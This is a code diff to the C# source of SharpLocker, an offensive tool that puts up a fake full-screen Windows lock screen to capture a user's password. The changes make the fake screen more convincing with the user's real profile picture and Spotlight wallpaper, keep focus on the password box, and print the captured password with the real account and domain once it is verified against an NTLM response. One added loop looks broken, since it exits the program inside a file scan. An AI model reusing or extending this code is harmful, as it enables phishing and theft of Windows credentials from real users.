@@ -1,4 +1,4 @@
-﻿using InternalMonologue;
+using InternalMonologue;
 using NetNTLMv2Checker;
 using System;
 using System.ComponentModel;
@@ -7,6 +7,9 @@ using System.Drawing;
 using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
 
 namespace SharpLocker
 {
@@ -27,7 +30,24 @@ $$\   $$ |$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |     $$ |  $$ |$$ |      $
                                         \__|                                                                
 
 ";
+        [DllImport("shell32.dll", EntryPoint = "#261",
+        CharSet = CharSet.Unicode, PreserveSig = false)]
+        public static extern void GetUserTilePath(
+        string username,
+        uint whatever, // 0x80000000
+        StringBuilder picpath, int maxLength);
 
+        public static string GetUserTilePath(string username)
+        {   // username: use null for current user
+            var sb = new StringBuilder(1000);
+            GetUserTilePath(username, 0x80000000, sb, sb.Capacity);
+            return sb.ToString();
+        }
+
+        public static Image GetUserTile(string username)
+        {
+            return Image.FromFile(GetUserTilePath(username));
+        }
         public LockScreenForm()
         {
             InitializeComponent();
@@ -39,29 +59,41 @@ $$\   $$ |$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |     $$ |  $$ |$$ |      $
             Location = new Point(0, 0);
             Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
 
-
-            Image myimage = new Bitmap(@"C:\Windows\Web\Wallpaper\Windows\img0.jpg");
+            Image myimage = new Bitmap(getSpotlightImage());
             BackgroundImage = myimage;
+
             BackgroundImageLayout = ImageLayout.Stretch;
             TopMost = true;
-            
+
             string userName = Environment.UserName;
             UserNameLabel.Text = userName;
             UserNameLabel.BackColor = Color.Transparent;
-            
+
             int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
             int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 29;
             int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
             int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 50;
             int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;
-           
+
+            if (!PasswordTextBox.Focus())
+            {
+                PasswordTextBox.Focus();
+            }
+
+            ActiveControl = PasswordTextBox;
+
+            if (CanFocus)
+            {
+                Focus();
+            }
+
             PasswordTextBox.Top = usernameloch;
             PasswordTextBox.UseSystemPasswordChar = true;
             ProfileIcon.Top = usericonh;
             SubmitPasswordButton.Top = buttonh;
             UserNameLabel.Top = usernameh;
             LockedLabel.Top = locked;
-            
+                        
             foreach (var screen in Screen.AllScreens)
             {
                 Thread thread = new Thread(() => WorkThreadFunction(screen));
@@ -69,6 +101,32 @@ $$\   $$ |$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |     $$ |  $$ |$$ |      $
             }
         }
 
+        public string getSpotlightImage()
+        {
+            //Get Windows Spotlight Images Location Path. (C:\Users\[Username]\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\)
+            string spotlight_dir_path = @Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\");
+
+            /* Save the name of the larger image from spotlight dir.
+             * Normally the larger image present in this directory is the current lock screen image. */
+            string img_name = "";
+            DirectoryInfo folderInfo = new DirectoryInfo(spotlight_dir_path);
+            long largestSize = 0;
+            foreach (var fi in folderInfo.GetFiles())
+            {
+                // log errors
+                Taskbar.Show();
+                Application.Exit();
+
+                if (fi.Length > largestSize)
+                {
+                    largestSize = fi.Length;
+                    img_name = fi.Name;
+                }
+            }
+            //Save image full path
+            string img_path = Path.Combine(spotlight_dir_path, img_name);
+            return img_path;
+        }
         public void WorkThreadFunction(Screen screen)
         {
             try
@@ -106,7 +164,7 @@ $$\   $$ |$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |     $$ |  $$ |$$ |      $
                 return parms;
             }
         }
-        
+
         protected override void OnClosing(CancelEventArgs e)
         {
             Taskbar.Show();
@@ -115,7 +173,7 @@ $$\   $$ |$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |     $$ |  $$ |$$ |      $
 
         private void PasswordTextBox_TextChanged(object sender, EventArgs e)
         {
-            
+
         }
 
         private void SubmitPasswordButton_Click(object sender, EventArgs e)
@@ -132,7 +190,7 @@ $$\   $$ |$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |     $$ |  $$ |$$ |      $
 
         }
 
-        static int tableWidth = 73; 
+        static int tableWidth = 73;
 
         static void PrintLine()
         {
@@ -180,14 +238,17 @@ $$\   $$ |$$ |  $$ |$$  __$$ |$$ |      $$ |  $$ |$$ |     $$ |  $$ |$$ |      $
             string netNTLMv2Response = netntlmv2.Replace("\n", String.Empty); ;
             IMChecker checker = new IMChecker(netNTLMv2Response);
 
+            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            string domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
+
             if (checker.checkPassword(plainpassword))
-                {
+            {
                 Console.WriteLine("[x] Success: Password Acquired");
                 Console.WriteLine("");
                 PrintLine();
                 PrintRow("Account", "Domain", "Password");
                 PrintLine();
-                PrintRow("Matt", "BANKABC", plainpassword);
+                PrintRow(userName, domain, plainpassword);
                 PrintLine();
             }
             else
